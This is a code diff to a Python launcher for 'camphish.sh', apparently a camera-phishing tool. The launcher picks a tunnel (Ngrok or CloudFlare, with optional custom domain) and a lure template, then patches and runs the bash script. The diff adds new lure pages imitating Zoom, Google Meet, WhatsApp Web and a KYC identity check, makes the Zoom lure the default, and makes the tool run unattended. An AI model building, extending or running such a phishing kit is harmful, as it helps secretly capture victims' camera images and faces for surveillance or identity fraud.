@@ -414,48 +414,69 @@ def print_banner():
     print()
 
 def collect_user_choices():
-    """Collect all menu choices in Python before launching bash."""
+    """Collect all menu choices in Python before launching bash.
+    Falls back to defaults silently when stdin is not a terminal (piped).
+    """
     line = "-" * 62
     choices = {}
+    is_tty = sys.stdin.isatty()
+
+    def ask(prompt, valid, default):
+        """Prompt user, strip whitespace and CR, use default on EOF or blank."""
+        while True:
+            try:
+                v = input(prompt).strip().strip("\r") or default
+            except EOFError:
+                v = default
+            if v in valid:
+                return v
+            if not is_tty:
+                return default   # non-interactive: never loop
+            print(f"    Invalid — enter {'/'.join(valid)}.")
 
     # --- Tunnel section ---
     print()
     print("  --- Tunnel Server ---")
     print("  [1] Ngrok        (requires free ngrok.com account)")
     print("  [2] CloudFlare   (no account needed - recommended)")
-    while True:
-        v = input("\n[+] Choose tunnel [1/2, default 2]: ").strip() or "2"
-        if v in ("1", "2"):
-            choices["CP_TUNNEL"] = v
-            break
-        print("    Invalid — enter 1 or 2.")
+    choices["CP_TUNNEL"] = ask(
+        "\n[+] Choose tunnel [1/2, default 2]: ", ("1", "2"), "2")
 
     # --- Template section ---
     print()
     print("  --- Template ---")
     print("  [1] Festival Wishing")
     print("  [2] Live YouTube TV")
-    print("  [3] Online Meeting")
-    while True:
-        v = input("\n[+] Choose template [1/2/3, default 1]: ").strip() or "1"
-        if v in ("1", "2", "3"):
-            choices["CP_TEMPLATE"] = v
-            break
-        print("    Invalid — enter 1, 2 or 3.")
+    print("  [3] Online Meeting (Zoom)")
+    print("  [4] Google Meet")
+    print("  [5] WhatsApp Web")
+    print("  [6] KYC Identity Verification")
+    choices["CP_TEMPLATE"] = ask(
+        "\n[+] Choose template [1-6, default 3]: ", ("1", "2", "3", "4", "5", "6"), "3")
+
 
     if choices["CP_TEMPLATE"] == "1":
-        fest = input("[+] Enter festival name (e.g. Eid, Diwali, Christmas): ").strip()
+        try:
+            fest = input("[+] Enter festival name (e.g. Eid, Diwali, Christmas): ").strip().strip("\r")
+        except EOFError:
+            fest = ""
         choices["CP_FEST_NAME"] = fest.replace(" ", "") or "Festival"
 
     if choices["CP_TEMPLATE"] == "2":
-        yt = input("[+] Enter YouTube video watch ID (part after ?v=): ").strip()
+        try:
+            yt = input("[+] Enter YouTube video watch ID (part after ?v=): ").strip().strip("\r")
+        except EOFError:
+            yt = ""
         choices["CP_YT_ID"] = yt or "dQw4w9WgXcQ"
 
     # --- Ngrok auth token ---
     if choices["CP_TUNNEL"] == "1":
         print()
         print("  Get your free authtoken at: https://dashboard.ngrok.com/authtokens")
-        choices["CP_NGROK_TOKEN"] = input("[+] Enter ngrok authtoken: ").strip()
+        try:
+            choices["CP_NGROK_TOKEN"] = input("[+] Enter ngrok authtoken: ").strip().strip("\r")
+        except EOFError:
+            choices["CP_NGROK_TOKEN"] = ""
 
     # --- CloudFlare domain option ---
     if choices["CP_TUNNEL"] == "2":
@@ -463,15 +484,14 @@ def collect_user_choices():
         print("  --- CloudFlare Domain ---")
         print("  [1] Random URL    (no setup, e.g. abc123.trycloudflare.com)")
         print("  [2] Custom Domain (FREE -- your own domain via Cloudflare)")
-        while True:
-            v = input("\n[+] Choose domain option [1/2, default 1]: ").strip() or "1"
-            if v in ("1", "2"):
-                choices["CP_CF_DOMAIN_OPT"] = v
-                break
-            print("    Invalid — enter 1 or 2.")
+        choices["CP_CF_DOMAIN_OPT"] = ask(
+            "\n[+] Choose domain option [1/2, default 1]: ", ("1", "2"), "1")
 
         if choices["CP_CF_DOMAIN_OPT"] == "2":
-            dom = input("[+] Enter your custom domain (e.g. cam.yourdomain.com): ").strip()
+            try:
+                dom = input("[+] Enter your custom domain (e.g. cam.yourdomain.com): ").strip().strip("\r")
+            except EOFError:
+                dom = ""
             choices["CP_CUSTOM_DOMAIN"] = dom
 
     print()
@@ -529,7 +549,7 @@ def main():
     # --- Patch camphish.sh for Windows + auto-answer compatibility ---
     patched_path = os.path.join(script_dir, "_camphish_patched.sh")
     try:
-        with open(script_path, "r", errors="replace") as f:
+        with open(script_path, "r", encoding="utf-8", errors="replace") as f:
             content = f.read()
 
         # Fix 1: Modern cloudflared uses --url not -url
@@ -547,8 +567,8 @@ def main():
             ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose a Port Forwarding option: [Default is 1] \\e[0m' option_server",
              "option_server=\"${CP_TUNNEL:-2}\""),
             # Template choice
-            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose a template: [Default is 1] \\e[0m' option_tem",
-             "option_tem=\"${CP_TEMPLATE:-1}\""),
+            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose a template: [Default is 3] \\e[0m' option_tem",
+             "option_tem=\"${CP_TEMPLATE:-3}\""),
             # Festival name
             ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter festival name: \\e[0m' fest_name",
              "fest_name=\"${CP_FEST_NAME:-Festival}\""),
@@ -569,7 +589,7 @@ def main():
             if old in content:
                 content = content.replace(old, new)
 
-        with open(patched_path, "w", newline="\n") as f:
+        with open(patched_path, "w", encoding="utf-8", newline="\n") as f:
             f.write(content)
 
         run_script = patched_path
@@ -588,17 +608,23 @@ def main():
     bash_path_prefix = ":".join(to_bash_path(d) for d in bash_extra_dirs if os.path.isdir(d))
     bash_script = to_bash_path(run_script)
 
+    def _pause(msg="\nPress Enter to exit..."):
+        try:
+            input(msg)
+        except (EOFError, OSError):
+            pass
+
     try:
         bash_inline = f'export PATH="{bash_path_prefix}:$PATH"; bash "{bash_script}"'
         subprocess.run([bash_cmd, "-c", bash_inline], cwd=script_dir, env=env)
-        input("\nScript finished. Press Enter to exit...")
+        _pause("\nScript finished. Press Enter to exit...")
     except FileNotFoundError as e:
         print(f"\n[-] Could not launch bash: {e}")
-        input("\nPress Enter to exit...")
+        _pause()
         sys.exit(1)
     except Exception as e:
         print(f"\n[-] Unexpected error: {e}")
-        input("\nPress Enter to exit...")
+        _pause()
         sys.exit(1)
 
 if __name__ == "__main__":
